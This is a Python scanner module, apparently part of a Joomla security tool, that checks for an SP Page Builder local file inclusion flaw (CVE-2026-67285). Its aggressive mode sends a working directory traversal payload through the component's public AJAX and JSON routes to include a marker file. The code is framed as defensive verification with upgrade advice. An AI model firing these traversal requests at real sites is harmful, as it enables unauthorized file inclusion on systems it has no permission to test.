from __future__ import annotations

import re
from typing import Any
from urllib.parse import urlencode

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-67285"
NAME = "SP Page Builder unauthenticated local PHP file inclusion"
COMPONENT = "SP Page Builder"
AFFECTED_RULE = "SP Page Builder 1.0.0 through 6.7.0; fixed in 6.8.0"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
AJAX_PATH = "/index.php?option=com_sppagebuilder&task=ajax"
JSON_VIEW_PATH = "/index.php?option=com_sppagebuilder&view=ajax&format=json"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.8.0")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("sppagebuilder", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="SP Page Builder was not detected through its public manifest or asset paths.", action="No action is required unless SP Page Builder is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected SP Page Builder {version}, within the affected range below 6.8.0."
        action = "Upgrade SP Page Builder to 6.8.0 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected SP Page Builder {version}, which restricts addon names to a bare directory name."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "SP Page Builder was detected, but its version could not be determined."
        action = "Determine the installed SP Page Builder version and upgrade to 6.8.0 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_aggressive_probe(
    target_url: str,
    addon: str = "../../../tmp/proofcms-lfi",
    marker: str = "PROOFCMS_LFI_MARKER",
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Try the addon-name traversal through the public AJAX and JSON view routes.

    6.7.0 and earlier build ``require_once .../addons/<addon>/site.php`` from
    the addon name. 6.8.0 restricts ``getAddonPath()`` to
    ``^[A-Za-z0-9_-]+$``. The lab places a benign marker in
    ``tmp/proofcms-lfi/site.php``; a reachable include echoes it.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    attempts = [
        f"{base}{AJAX_PATH}&{urlencode({'addon': addon, 'format': 'raw'})}",
        f"{base}{AJAX_PATH}&{urlencode({'addon': addon})}",
        f"{base}{JSON_VIEW_PATH}",
    ]
    last_status = 0
    last_body = ""
    for url in attempts:
        if url.endswith(JSON_VIEW_PATH):
            response = client.request(
                url,
                method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data=urlencode({"name": addon, "id": "1"}).encode(),
                timeout=timeout,
            )
        else:
            response = client.get(url, timeout=timeout)
        if is_transport_error(response):
            continue
        last_status = response.get("status", 0)
        last_body = response.get("body") or ""
        if marker in last_body:
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="VULNERABLE",
                confidence="CONFIRMED",
                component=COMPONENT,
                affected_rule=AFFECTED_RULE,
                exploit_available=True,
                exploit_ran=True,
                proof_url=url,
                evidence={"addon": addon, "marker": marker, "status": last_status, "marker_found": True},
                detail="The addon name traversed out of the addon directory and included the local marker file.",
                action="Upgrade SP Page Builder to 6.8.0 or newer.",
            )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="BLOCKED_EXTERNAL" if last_status in (0, 403, 404, 500) else "NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{AJAX_PATH}",
        evidence={"addon": addon, "marker": marker, "status": last_status, "body_length": len(last_body), "marker_found": False},
        detail=(
            "The public addon routes did not include the marker file. The 6.0.0 fixture filters the "
            "addon parameter and the JSON view requires an editor session; 6.8.0+ restricts the addon name."
        ),
        action="Upgrade affected SP Page Builder versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_sppagebuilder"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The component page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The component is reachable; the traversal payload was not sent in safe mode.", action="Use aggressive mode with a local site.php marker on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because SP Page Builder was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            addon=aggressive_value(aggressive_args, aggressive_command, "addon") or "../../../tmp/proofcms-lfi",
            marker=aggressive_value(aggressive_args, aggressive_command, "marker") or "PROOFCMS_LFI_MARKER",
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (component reachability) and aggressive (addon traversal) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Local File Inclusion", "module_version": "1.0.0", "last_reviewed": "2026-11-16", "updated": "2026-11-16", "required_detectors": ["sppagebuilder"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-67285", "https://www.joomshaper.com", "https://mysites.guru/vulnerabilities/CVE-2026-67285"]}
